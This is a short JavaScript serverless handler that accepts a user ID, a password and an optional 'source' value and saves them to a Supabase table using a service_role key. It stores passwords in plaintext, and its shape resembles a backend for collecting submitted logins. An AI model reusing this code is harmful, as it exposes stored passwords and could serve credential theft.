import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY   // use service_role key here (keep it secret)
);

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { user_id, pass, source } = req.body;

    if (!user_id || !pass) {
      return res.status(400).json({ error: "Missing user_id or pass" });
    }

    const { error } = await supabase.from("your_table_name").insert({
      user_id: user_id,
      pass: pass
      // source: source   ← uncomment if you added this column
    });

    if (error) {
      console.error(error);
      return res.status(500).json({ error: "Failed to save" });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
}